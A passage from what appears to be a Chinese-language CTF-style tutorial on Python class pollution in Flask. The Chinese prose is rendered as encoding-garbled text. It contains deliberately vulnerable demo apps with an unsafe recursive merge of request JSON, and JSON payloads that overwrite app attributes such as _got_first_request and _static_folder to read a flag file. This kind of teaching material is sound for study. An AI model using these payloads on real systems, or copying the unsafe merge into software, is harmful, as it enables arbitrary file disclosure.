</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span><span class="n">request</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">merge</span><span class="p">(</span><span class="n">src</span><span class="p">,</span> <span class="n">dst</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Recursive merge function</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">src</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="s1">&#39;__getitem__&#39;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">dst</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">k</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">==</span> <span class="nb">dict</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">merge</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="n">dst</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">k</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">dst</span><span class="p">[</span><span class="n">k</span><span class="p">]</span> <span class="o">=</span> <span class="n">v</span>
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">==</span> <span class="nb">dict</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">merge</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">setattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">cls</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">pass</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">instance</span> <span class="o">=</span> <span class="bp">cls</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="s2">&#34;Is flag here?&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.before_first_request</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">init</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="n">flag</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">app</span><span class="p">,</span> <span class="s2">&#34;special&#34;</span><span class="p">)</span> <span class="ow">and</span> <span class="n">app</span><span class="o">.</span><span class="n">special</span> <span class="o">==</span> <span class="s2">&#34;U_Polluted_It&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">flag</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;flag&#34;</span><span class="p">,</span> <span class="s2">&#34;rt&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span><span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">,</span> <span class="s1">&#39;GET&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">data</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">merge</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">data</span><span class="p">),</span> <span class="n">instance</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="n">flag</span>
</span></span><span class="line"><span class="cl">    <span class="nb">setattr</span><span class="p">(</span><span class="n">app</span><span class="p">,</span> <span class="s2">&#34;special&#34;</span><span class="p">,</span> <span class="s2">&#34;U_Polluted_It&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">flag</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s2">&#34;0.0.0.0&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>before_first_request</code>‰øÆÈ•∞ÁöÑ<code>init</code>ÂáΩÊï∞Âè™‰ºöÂú®Á¨¨‰∏ÄÊ¨°ËÆøÈóÆÂâçË¢´Ë∞ÉÁî®ÔºåËÄåÂÖ∂‰∏≠ËØªÂèñ<code>flag</code>ÁöÑÈÄªËæëÂèàÈúÄË¶ÅËÆøÈóÆË∑ØÁî±<code>/</code>ÂêéÊâçËÉΩËß¶ÂèëÔºåËøôÂ∞±ÊûÑÊàê‰∫ÜÁüõÁõæ„ÄÇÊâÄ‰ª•ÈúÄË¶Å‰ΩøÁî®<code>payload</code>Âú®ËÆøÈóÆ<code>/</code>ÂêéÈáçÁΩÆ<code>_got_first_request</code>Â±ûÊÄßÂÄº‰∏∫ÂÅáÔºåËøôÊ†∑<code>before_first_request</code>Êâç‰ºöÂÜçÊ¨°Ë∞ÉÁî®„ÄÇ</p>
<p>payload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;__init__&#34;</span> <span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;__globals__&#34;</span> <span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;app&#34;</span> <span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;_got_first_request&#34;</span> <span class="p">:</span><span class="n">false</span> 
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="_static_url_path">_static_url_path
</h5><p>Ëøô‰∏™Â±ûÊÄß‰∏≠Â≠òÊîæÁöÑÊòØ<code>flask</code>‰∏≠ÈùôÊÄÅÁõÆÂΩïÁöÑÂÄºÔºåÈªòËÆ§ËØ•ÂÄº‰∏∫<code>static</code>„ÄÇËÆøÈóÆ<code>flask</code>‰∏ãÁöÑËµÑÊ∫êÂèØ‰ª•ÈááÁî®Â¶Ç<code>http://domain/static/xxx</code>ÔºåËøôÊ†∑ÂÆûÈôÖ‰∏äÂ∞±Áõ∏ÂΩì‰∫éËÆøÈóÆ<code>_static_url_path</code>ÁõÆÂΩï‰∏ã<code>xxx</code>ÁöÑÊñá‰ª∂Âπ∂Â∞ÜËØ•Êñá‰ª∂ÂÜÖÂÆπ‰Ωú‰∏∫ÂìçÂ∫îÂÜÖÂÆπËøîÂõû,‰ΩÜÊòØÂ¶ÇÊûúÊàë‰ª¨ÊÉ≥Ë¶ÅËÆøÈóÆÂÖ∂‰ªñÊñá‰ª∂‰∏ãÈù¢ÁöÑÊïèÊÑü‰ø°ÊÅØÔºåÊàë‰ª¨Â∞±ÈúÄË¶ÅÊ±°ÊüìËøô‰∏™ÈùôÊÄÅÁõÆÂΩïÔºåËÆ©‰ªñËá™Âä®Â∏ÆÊàë‰ª¨ÂÆûÁé∞ÂÆöÂêë</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">#static/index.html
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>hello<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>    
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1">#app.py</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span><span class="n">request</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">merge</span><span class="p">(</span><span class="n">src</span><span class="p">,</span> <span class="n">dst</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Recursive merge function</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">src</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="s1">&#39;__getitem__&#39;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">dst</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">k</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">==</span> <span class="nb">dict</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">merge</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="n">dst</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">k</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">dst</span><span class="p">[</span><span class="n">k</span><span class="p">]</span> <span class="o">=</span> <span class="n">v</span>
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">==</span> <span class="nb">dict</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">merge</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">setattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">cls</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">pass</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">instance</span> <span class="o">=</span> <span class="bp">cls</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span><span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">,</span> <span class="s1">&#39;GET&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">data</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">merge</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">data</span><span class="p">),</span> <span class="n">instance</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s2">&#34;flag in ./flag but heres only static/index.html&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s2">&#34;0.0.0.0&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Ê≠§Êó∂<code>http://domain/static/xxx</code>Âè™ËÉΩËÆøÈóÆÂà∞Êñá‰ª∂Á≥ªÁªüÂΩìÂâçÁõÆÂΩï‰∏ã<code>static</code>ÁõÆÂΩï‰∏≠ÁöÑ<code>xxx</code>Êñá‰ª∂ÔºåÂπ∂‰∏î‰∏çÂ≠òÂú®Â¶ÇÁõÆÂΩïÁ©øË∂äÁöÑÊºèÊ¥û,Ê±°ÊüìËØ•Â±ûÊÄß‰∏∫ÂΩìÂâçÁõÆÂΩï„ÄÇËøôÊ†∑Â∞±ËÉΩËÆøÈóÆÂà∞ÂΩìÂâçÁõÆÂΩï‰∏ãÁöÑ<code>flag</code>Êñá‰ª∂‰∫Ü</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;__init__&#34;</span><span class="p">:{</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;__globals__&#34;</span><span class="p">:{</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;app&#34;</span><span class="p">:{</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;_static_folder&#34;</span><span class="p">:</span><span class="s2">&#34;./&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÁÑ∂ÂêéÂÜçËÆøÈóÆstaticÁõÆÂΩï‰∏ãÊñá‰ª∂Â∞±Ë°å‰∫Ü</p>
<h5 id="ospathpardir">os.path.pardir
</h5><p>Ëøô‰∏™<code>os</code>Ê®°Âùó‰∏ãÁöÑÂèòÈáè‰ºöÂΩ±Âìç<code>flask</code>ÁöÑÊ®°ÊùøÊ∏≤ÊüìÂáΩÊï∞<code>render_template</code>ÁöÑËß£ÊûêÔºåÊâÄ‰ª•‰πüÊî∂ÂΩïÂú®<code>flask</code>ÈÉ®ÂàÜ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">#templates/index.html
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>hello<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>    
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1">#app.py</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span><span class="n">request</span><span class="p">,</span><span class="n">render_template</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">merge</span><span class="p">(</span><span class="n">src</span><span class="p">,</span> <span class="n">dst</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Recursive merge function</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">src</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="s1">&#39;__getitem__&#39;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">dst</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">k</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">==</span> <span class="nb">dict</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">merge</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="n">dst</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">k</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">dst</span><span class="p">[</span><span class="n">k</span><span class="p">]</span> <span class="o">=</span> <span class="n">v</span>
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">==</span> <span class="nb">dict</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">merge</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">setattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">cls</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">pass</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">instance</span> <span class="o">=</span> <span class="bp">cls</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span><span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">,</span> <span class="s1">&#39;GET&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">data</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">merge</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">data</span><span class="p">),</span> <span class="n">instance</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s2">&#34;flag in ./flag but u just can use /file to vist ./templates/file&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/&lt;path:path&gt;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">render_page</span><span class="p">(</span><span class="n">path</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="s2">&#34;templates/&#34;</span> <span class="o">+</span> <span class="n">path</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;not found&#34;</span><span class="p">,</span> <span class="mi">404</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s2">&#34;0.0.0.0&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Áõ¥Êé•ËÆøÈóÆ<code>http://domain/xxx</code>Êó∂‰ºö‰ΩøÁî®<code>render_tempaltes</code>Ê∏≤Êüì<code>templates/xxx</code>Êñá‰ª∂</p>
<p>Â¶ÇÊûúÂ∞ùËØïÁõÆÂΩïÁ©øË∂äÂàô‰ºöÂØºËá¥<code>render_template</code>ÂáΩÊï∞Êä•Èîô500</p>
<p>ÊâæÂà∞Êä•ÈîôÁöÑÊ∫êÁ†Å</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">_get_source_fast</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="p">,</span> <span class="n">environment</span><span class="p">:</span> <span class="n">BaseEnvironment</span><span class="p">,</span> <span class="n">template</span><span class="p">:</span> <span class="nb">str</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">tuple</span><span class="p">[</span><span class="nb">str</span><span class="p">,</span> <span class="nb">str</span> <span class="o">|</span> <span class="kc">None</span><span class="p">,</span> <span class="n">t</span><span class="o">.</span><span class="n">Callable</span><span class="p">[[],</span> <span class="nb">bool</span><span class="p">]</span> <span class="o">|</span> <span class="kc">None</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">_srcobj</span><span class="p">,</span> <span class="n">loader</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">_iter_loaders</span><span class="p">(</span><span class="n">template</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">loader</span><span class="o">.</span><span class="n">get_source</span><span class="p">(</span><span class="n">environment</span><span class="p">,</span> <span class="n">template</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">except</span> <span class="n">TemplateNotFound</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">continue</span>
</span></span><span class="line"><span class="cl">        <span class="k">raise</span> <span class="n">TemplateNotFound</span><span class="p">(</span><span class="n">template</span><span class="p">)</span>
